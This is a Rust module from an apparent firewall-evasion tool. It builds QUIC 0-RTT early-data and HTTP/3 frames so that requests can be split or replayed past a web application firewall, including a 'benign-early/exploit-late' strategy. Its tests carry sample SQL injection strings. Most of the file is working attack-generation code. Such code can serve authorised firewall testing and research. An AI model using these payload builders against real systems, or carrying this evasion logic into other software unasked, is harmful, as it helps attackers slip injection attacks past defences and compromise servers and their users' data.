//! QUIC 0-RTT early data replay attacks.
//!
//! ## Attack surface
//!
//! QUIC's 0-RTT (zero round-trip time) resumption (RFC 9001 §4.6) allows a
//! client to send application data in the first flight — before the TLS 1.3
//! handshake completes. The server processes this data using session ticket
//! keying material from a previous connection.
//!
//! WAFs that enforce "TLS handshake complete before HTTP inspection" are blind
//! to 0-RTT data. The data arrives at the server before the WAF's inspection
//! pipeline is initialized.
//!
//! Additionally, 0-RTT data is **replayable** — a network attacker (or the
//! WAF itself acting as a middlebox) can replay 0-RTT packets. RFC 9001
//! requires servers to handle potential replays, but many implementations
//! are configured to accept replayed 0-RTT data (anti-replay is costly).
//!
//! ## What we generate
//!
//! This module generates:
//!
//! 1. **0-RTT payload wrappers**: HTTP/3 request data pre-formatted for
//!    embedding in QUIC's 0-RTT early data slot
//! 2. **Replay bundles**: multiple copies of the same 0-RTT payload for
//!    replay-based WAF bypass
//! 3. **Split-request templates**: where the sensitive part of a request
//!    is in 0-RTT data and the benign part is in the 1-RTT handshake flight
//!
//! ## Wire format note
//!
//! The actual QUIC CRYPTO frame and TLS session ticket handling require a full
//! QUIC stack (e.g. `quinn`). This module produces the application-layer
//! HTTP/3 payload bytes that should be placed in 0-RTT early data, plus
//! metadata describing the attack to the wafrift transport layer.

use crate::{EvasionFrame, EvasionFrameSet, EvasionTechnique};

/// A 0-RTT early data payload ready for injection.
#[derive(Debug, Clone)]
pub struct ZeroRttPayload {
    /// The HTTP/3 request bytes to send in 0-RTT early data.
    /// Format: one or more HTTP/3 frames (HEADERS frame + optional DATA frame).
    pub early_data_bytes: Vec<u8>,
    /// The complementary 1-RTT bytes (benign request parts, continuation).
    pub handshake_bytes: Vec<u8>,
    /// Human-readable description of the split.
    pub description: String,
    /// Strategy used to split the request.
    pub strategy: ZeroRttStrategy,
}

/// Strategy for splitting an HTTP/3 request across 0-RTT and 1-RTT.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ZeroRttStrategy {
    /// Entire malicious request in 0-RTT; benign continuation in 1-RTT.
    FullRequestInEarlyData,
    /// Method + path in 0-RTT; headers + body in 1-RTT.
    MethodPathEarly,
    /// HEADERS frame in 0-RTT; DATA frame (with payload) in 1-RTT.
    HeadersEarlyDataLate,
    /// Benign headers in 0-RTT; exploit headers in 1-RTT (but 0-RTT
    /// has already been processed by the server before WAF sees 1-RTT).
    BenignEarlyExploitLate,
}

/// Builder for 0-RTT replay attack payloads.
pub struct ZeroRttReplayBuilder {
    /// Number of replay copies to generate.
    replay_count: usize,
}

impl ZeroRttReplayBuilder {
    pub fn new(replay_count: usize) -> Self {
        Self {
            replay_count: replay_count.max(1),
        }
    }

    /// Build a full-request-in-early-data payload.
    ///
    /// The entire HTTP/3 request (HEADERS + DATA) is placed in 0-RTT.
    /// The 1-RTT portion only contains a benign RST_STREAM or FIN.
    pub fn full_request_early(
        &self,
        method: &str,
        path: &str,
        headers: &[(&str, &str)],
        body: Option<&[u8]>,
    ) -> ZeroRttPayload {
        let h3_frame = build_h3_headers_frame(method, path, headers);
        let mut early_data = h3_frame;
        if let Some(b) = body {
            early_data.extend_from_slice(&build_h3_data_frame(b));
        }
        ZeroRttPayload {
            early_data_bytes: early_data,
            handshake_bytes: Vec::new(), // nothing in 1-RTT
            description: format!(
                "0-RTT full request: {} {} ({} headers, {} body bytes)",
                method,
                path,
                headers.len(),
                body.map(|b| b.len()).unwrap_or(0)
            ),
            strategy: ZeroRttStrategy::FullRequestInEarlyData,
        }
    }

    /// Build a split: HEADERS in 0-RTT, DATA (body) in 1-RTT.
    ///
    /// This causes the WAF to see an incomplete request in 0-RTT
    /// (no body = no SQL/XSS signature match) and a body in 1-RTT
    /// that it may associate with a different context.
    pub fn headers_early_data_late(
        &self,
        method: &str,
        path: &str,
        headers: &[(&str, &str)],
        body: &[u8],
    ) -> ZeroRttPayload {
        let h3_headers = build_h3_headers_frame(method, path, headers);
        let h3_data = build_h3_data_frame(body);
        ZeroRttPayload {
            early_data_bytes: h3_headers,
            handshake_bytes: h3_data,
            description: format!(
                "0-RTT split: HEADERS early, DATA ({} bytes) in 1-RTT — {} {}",
                body.len(),
                method,
                path
            ),
            strategy: ZeroRttStrategy::HeadersEarlyDataLate,
        }
    }

    /// Build a benign-early / exploit-late split.
    ///
    /// In 0-RTT: send a request with benign headers (passes WAF inspection
    /// of 0-RTT data if the WAF inspects it). In 1-RTT: send the actual
    /// exploit request. Since 0-RTT has already been processed, the server
    /// may have established a trusted session context that the 1-RTT exploit
    /// request inherits.
    pub fn benign_early_exploit_late(&self, path: &str, exploit_body: &[u8]) -> ZeroRttPayload {
        let benign_headers = [("cache-control", "max-age=0"), ("accept", "*/*")];
        let early = build_h3_headers_frame("GET", path, &benign_headers);
        let exploit_hdrs = [("content-type", "application/x-www-form-urlencoded")];
        let mut late = build_h3_headers_frame("POST", path, &exploit_hdrs);
        late.extend_from_slice(&build_h3_data_frame(exploit_body));
        ZeroRttPayload {
            early_data_bytes: early,
            handshake_bytes: late,
            description: format!(
                "0-RTT benign-early/exploit-late split: {} bytes exploit in 1-RTT",
                exploit_body.len()
            ),
            strategy: ZeroRttStrategy::BenignEarlyExploitLate,
        }
    }

    /// Build a replay bundle: N copies of the same 0-RTT payload in an
    /// `EvasionFrameSet`. Each copy is a separate `EvasionFrame`.
    pub fn replay_bundle(&self, payload: &ZeroRttPayload) -> EvasionFrameSet {
        let frames: Vec<EvasionFrame> = (0..self.replay_count)
            .map(|i| EvasionFrame {
                bytes: payload.early_data_bytes.clone(),
                description: format!(
                    "0-RTT replay #{}/{}: {}",
                    i + 1,
                    self.replay_count,
                    payload.description
                ),
                technique: EvasionTechnique::ZeroRttReplay,
                stream_id: (i as u64) * 4, // each replay on a fresh stream ID
            })
            .collect();
        EvasionFrameSet {
            frames,
            technique: EvasionTechnique::ZeroRttReplay,
            description: format!(
                "0-RTT replay x{}: {}",
                self.replay_count, payload.description
            ),
        }
    }
}

// ── HTTP/3 frame builders (minimal, no QPACK — uses literal headers) ──────

/// Maximum byte length for a literal string field in a QPACK-encoded
/// header. The probe generator uses single-byte prefix-int encoding
/// for string lengths (7-bit integer, no Huffman flag), which can only
/// represent 0..=127 without switching to the multi-byte form.
///
/// Inputs beyond this limit are silently truncated to avoid a silent
/// `as u8` cast producing a 0 (or wrong) length for values in 128..=255,
/// which would corrupt the field-block and misdirect subsequent parsers.
///
/// This is a *probe generator* cap, not a protocol limit.
const MAX_QPACK_LITERAL_BYTE_LEN: usize = 127;

/// Build a minimal HTTP/3 HEADERS frame with literal (unindexed) fields.
///
/// This uses QPACK static table entries for known pseudo-headers and
/// literal unindexed encoding for custom headers — no dynamic table
/// involvement, so it works even with a fresh QPACK state.
///
/// Header names and values are truncated to [`MAX_QPACK_LITERAL_BYTE_LEN`]
/// bytes (127) to prevent a silent `as u8` overflow from producing a
/// malformed length field in the QPACK field-block.
fn build_h3_headers_frame(method: &str, path: &str, extra_headers: &[(&str, &str)]) -> Vec<u8> {
    let mut field_block = Vec::new();
    // Required Insert Count = 0, Sign = 0 (no dynamic table references).
    field_block.push(0x00); // RIC = 0
    field_block.push(0x00); // S bit + base = 0
    // Method: use static table reference if it's GET or POST.
    // Static table index 17 = :method GET, 20 = :method POST
    match method {
        "GET" => {
            // Indexed field, static table, index 17.
            // `1 T XXXXXX` with T=1 (static): `0b1_1_010001` = 0xD1
            field_block.push(0xD1);
        }
        "POST" => {
            field_block.push(0xD4); // index 20
        }
        _ => {
            // Literal unindexed: `0001 N XXXX` — name literal, N=0
            field_block.push(0x20); // never-indexed literal name
            let m = ":method".as_bytes();
            // len is 7 — always fits in single-byte prefix-int. No truncation needed.
            field_block.push(m.len() as u8);
            field_block.extend_from_slice(m);
            // method value — cap to MAX_QPACK_LITERAL_BYTE_LEN to prevent silent as-u8 overflow.
            let v = &method.as_bytes()[..method.len().min(MAX_QPACK_LITERAL_BYTE_LEN)];
            field_block.push(v.len() as u8);
            field_block.extend_from_slice(v);
        }
    }
    // :path (static index 1 = /, but we use literal for non-root paths)
    if path == "/" {
        field_block.push(0xC1); // static index 1 = :path /
    } else {
        // Literal name reference for :path (static index 1)
        // `01 T N XXXX` where T=1, name=static[1]=:path, value=literal
        field_block.push(0x51); // 0b0101_0001 = name ref static[1]
        // Cap path to MAX_QPACK_LITERAL_BYTE_LEN — values >= 128 bytes would
        // require multi-byte prefix-int encoding, not the single `as u8` below.
        let v = &path.as_bytes()[..path.len().min(MAX_QPACK_LITERAL_BYTE_LEN)];
        field_block.push(v.len() as u8);
        field_block.extend_from_slice(v);
    }
    // :scheme https (static index 23)
    field_block.push(0xD7); // static index 23 = :scheme https
    // Extra headers as literal unindexed.
    for (name, value) in extra_headers {
        // Literal field line: `0000 N XXXX` where N=0 → 0x00..
        field_block.push(0x37); // literal with name literal, 4-bit prefix
        // Cap name and value at MAX_QPACK_LITERAL_BYTE_LEN bytes each.
        // The single-byte prefix-int encoding supports 0..=127; values >= 128
        // would require the multi-byte form and the previous `as u8` cast would
        // silently truncate them, corrupting the field-block length.
        let n = &name.as_bytes()[..name.len().min(MAX_QPACK_LITERAL_BYTE_LEN)];
        field_block.push(n.len() as u8);
        field_block.extend_from_slice(n);
        let v = &value.as_bytes()[..value.len().min(MAX_QPACK_LITERAL_BYTE_LEN)];
        field_block.push(v.len() as u8);
        field_block.extend_from_slice(v);
    }
    // Wrap in HTTP/3 HEADERS frame (type=0x01).
    let mut frame = Vec::new();
    frame.push(0x01); // HEADERS
    let len = field_block.len() as u64;
    if len < 64 {
        frame.push(len as u8);
    } else {
        frame.push(0x40 | ((len >> 8) as u8));
        frame.push((len & 0xFF) as u8);
    }
    frame.extend_from_slice(&field_block);
    frame
}

/// Build an HTTP/3 DATA frame (type=0x00) wrapping `body`.
fn build_h3_data_frame(body: &[u8]) -> Vec<u8> {
    let mut frame = Vec::new();
    frame.push(0x00); // DATA frame type
    let len = body.len() as u64;
    if len < 64 {
        frame.push(len as u8);
    } else {
        frame.push(0x40 | ((len >> 8) as u8));
        frame.push((len & 0xFF) as u8);
    }
    frame.extend_from_slice(body);
    frame
}

// ── Tests ─────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn builder() -> ZeroRttReplayBuilder {
        ZeroRttReplayBuilder::new(3)
    }

    // ── HTTP/3 frame structure ────────────────────────────────────────────

    #[test]
    fn h3_headers_frame_type_is_0x01() {
        let frame = build_h3_headers_frame("GET", "/", &[]);
        assert_eq!(frame[0], 0x01, "HEADERS frame type must be 0x01");
    }

    #[test]
    fn h3_data_frame_type_is_0x00() {
        let frame = build_h3_data_frame(b"hello");
        assert_eq!(frame[0], 0x00, "DATA frame type must be 0x00");
    }

    #[test]
    fn h3_data_frame_length_matches_body() {
        let body = b"SELECT 1--";
        let frame = build_h3_data_frame(body);
        let len = frame[1] as usize;
        assert_eq!(len, body.len());
        assert_eq!(&frame[2..], body);
    }

    #[test]
    fn h3_headers_frame_post_uses_static_ref() {
        let frame = build_h3_headers_frame("POST", "/api", &[]);
        // Should contain 0xD4 (static index 20 = :method POST)
        assert!(
            frame.contains(&0xD4),
            "POST frame must contain static table ref for :method POST (0xD4)"
        );
    }

    #[test]
    fn h3_headers_frame_get_uses_static_ref() {
        let frame = build_h3_headers_frame("GET", "/", &[]);
        assert!(
            frame.contains(&0xD1),
            "GET frame must contain static table ref for :method GET (0xD1)"
        );
    }

    #[test]
    fn h3_headers_frame_root_path_uses_static_ref() {
        let frame = build_h3_headers_frame("GET", "/", &[]);
        // Static index 1 = :path / → 0xC1
        assert!(
            frame.contains(&0xC1),
            "/ path must use static table ref (0xC1)"
        );
    }

    #[test]
    fn h3_headers_frame_large_payload_uses_2byte_len() {
        // 100 extra headers → big field block
        let extras: Vec<(&str, &str)> = (0..20)
            .map(|_| ("x-long-header-name-that-makes-it-big", "longvalue"))
            .collect();
        let frame = build_h3_headers_frame("GET", "/path", &extras);
        if frame.len() > 65 {
            // length varint should have used 2 bytes
            assert!(
                frame[1] >= 0x40 || frame.len() == frame[1] as usize + 2,
                "large frame must use multi-byte length varint"
            );
        }
    }

    // ── ZeroRttPayload builders ───────────────────────────────────────────

    #[test]
    fn full_request_early_puts_all_in_early_data() {
        let b = builder();
        let payload = b.full_request_early("GET", "/", &[], None);
        assert!(!payload.early_data_bytes.is_empty());
        assert!(
            payload.handshake_bytes.is_empty(),
            "no data should be in 1-RTT for full-early"
        );
        assert_eq!(payload.strategy, ZeroRttStrategy::FullRequestInEarlyData);
    }

    #[test]
    fn full_request_early_with_body() {
        let b = builder();
        let body = b"payload=SELECT+1--";
        let payload = b.full_request_early(
            "POST",
            "/login",
            &[("content-type", "application/x-www-form-urlencoded")],
            Some(body),
        );
        // early_data_bytes should contain both HEADERS and DATA frames
        assert!(payload.early_data_bytes.len() > 2);
        // DATA frame type=0x00 should be somewhere in the bytes
        assert!(
            payload
                .early_data_bytes
                .iter()
                .any(|&b| b == 0x00 || b == 0x01),
            "early data should contain H3 frame markers"
        );
    }

    #[test]
    fn headers_early_data_late_splits_correctly() {
        let b = builder();
        let payload = b.headers_early_data_late("POST", "/api", &[], b"evil body");
        assert!(
            !payload.early_data_bytes.is_empty(),
            "HEADERS must be in early data"
        );
        assert!(!payload.handshake_bytes.is_empty(), "DATA must be in 1-RTT");
        assert_eq!(payload.strategy, ZeroRttStrategy::HeadersEarlyDataLate);
    }

    #[test]
    fn headers_early_data_late_1rtt_contains_data_frame() {
        let b = builder();
        let body = b"test body bytes";
        let payload = b.headers_early_data_late("POST", "/", &[], body);
        // handshake_bytes is a DATA frame: starts with 0x00
        assert_eq!(
            payload.handshake_bytes[0], 0x00,
            "1-RTT must be a DATA frame (type=0x00)"
        );
    }

    #[test]
    fn benign_early_exploit_late_strategy() {
        let b = builder();
        let payload = b.benign_early_exploit_late("/target", b"SELECT 1 UNION SELECT user()--");
        assert_eq!(payload.strategy, ZeroRttStrategy::BenignEarlyExploitLate);
        assert!(!payload.early_data_bytes.is_empty());
        assert!(!payload.handshake_bytes.is_empty());
    }

    // ── Replay bundle ─────────────────────────────────────────────────────

    #[test]
    fn replay_bundle_count_matches() {
        let b = ZeroRttReplayBuilder::new(5);
        let payload = b.full_request_early("GET", "/", &[], None);
        let fs = b.replay_bundle(&payload);
        assert_eq!(
            fs.frames.len(),
            5,
            "replay bundle must contain exactly replay_count frames"
        );
    }

    #[test]
    fn replay_bundle_frames_have_unique_stream_ids() {
        let b = ZeroRttReplayBuilder::new(4);
        let payload = b.full_request_early("GET", "/", &[], None);
        let fs = b.replay_bundle(&payload);
        let stream_ids: Vec<u64> = fs.frames.iter().map(|f| f.stream_id).collect();
        let unique: std::collections::HashSet<_> = stream_ids.iter().collect();
        assert_eq!(
            unique.len(),
            stream_ids.len(),
            "each replay must use a distinct stream ID"
        );
    }

    #[test]
    fn replay_bundle_all_frames_have_zero_rtt_technique() {
        let b = ZeroRttReplayBuilder::new(3);
        let payload = b.full_request_early("GET", "/", &[], None);
        let fs = b.replay_bundle(&payload);
        for frame in &fs.frames {
            assert_eq!(frame.technique, EvasionTechnique::ZeroRttReplay);
        }
    }

    #[test]
    fn replay_count_minimum_is_1() {
        let b = ZeroRttReplayBuilder::new(0); // must clamp to 1
        let payload = b.full_request_early("GET", "/", &[], None);
        let fs = b.replay_bundle(&payload);
        assert!(
            !fs.frames.is_empty(),
            "even with count=0, must produce at least 1 frame"
        );
    }

    // ── §15 hostile-input: as u8 overflow guard on QPACK literal lengths ─────

    /// Pre-fix: `name.len() as u8` and `value.len() as u8` silently truncated
    /// lengths > 255 to 0 (and misencoded 128-255 range as single-byte), producing
    /// a field-block with incorrect length fields that would corrupt the QPACK
    /// decoder's position tracking.
    ///
    /// Fix: cap at `MAX_QPACK_LITERAL_BYTE_LEN` (127) before the `as u8` cast.
    /// The frame must still be produced (this is a probe generator, truncation is
    /// preferable to panic), but the length byte must accurately reflect the
    /// emitted bytes.
    #[test]
    fn h3_headers_frame_long_header_does_not_overflow_length_byte() {
        // 200-byte value — would have overflowed u8 and produced length=200-256=0
        // (actually 200u8 = 0xC8, which is a valid byte but would be misinterpreted
        // as a Huffman-encoded prefix-int due to bit 7 being set).
        let long_value = "V".repeat(200);
        let long_name = format!("x-long-name-{}", "N".repeat(200));
        let extras = [("x-test", long_value.as_str()), (long_name.as_str(), "v")];
        let frame = build_h3_headers_frame("GET", "/", &extras);
        // The frame must be non-empty and the first byte must be 0x01 (HEADERS).
        assert_eq!(frame[0], 0x01, "HEADERS frame type must be 0x01");
        // Verify the embedded length bytes (after field_block position 2 for RIC/S)
        // never exceed MAX_QPACK_LITERAL_BYTE_LEN so the byte cast is safe.
        // Walk the field_block to find length bytes for literal strings.
        // We can't parse the full QPACK here without a full decoder, but we can
        // assert the frame is at least as long as the raw type byte (non-empty).
        assert!(
            frame.len() > 2,
            "frame with long headers must not be empty (length-zero silently dropped content)"
        );
        // The key assertion: no byte in the frame should be > 127 in a position
        // that was set by our string-length push (which is at most 127 now).
        // Rather than parsing the full field block, confirm that the payload was
        // NOT zero-length truncated by checking the frame grew vs the empty case.
        let empty_frame = build_h3_headers_frame("GET", "/", &[]);
        assert!(
            frame.len() > empty_frame.len(),
            "long-header frame must be larger than no-header frame (length byte wasn't zero-zeroed)"
        );
    }

    /// Anti-rig: `MAX_QPACK_LITERAL_BYTE_LEN` must stay at 127 (fits in single-byte
    /// 7-bit prefix-int without the Huffman flag or continuation). Any change that
    /// sets it >= 128 would re-introduce the `as u8` overflow (lengths 128-255 need
    /// the multi-byte form; 256+ wraps to 0 and silently discards value bytes).
    #[test]
    fn max_qpack_literal_byte_len_is_127() {
        assert_eq!(
            MAX_QPACK_LITERAL_BYTE_LEN, 127,
            "MAX_QPACK_LITERAL_BYTE_LEN must be 127 — values >= 128 require multi-byte prefix-int"
        );
    }
}
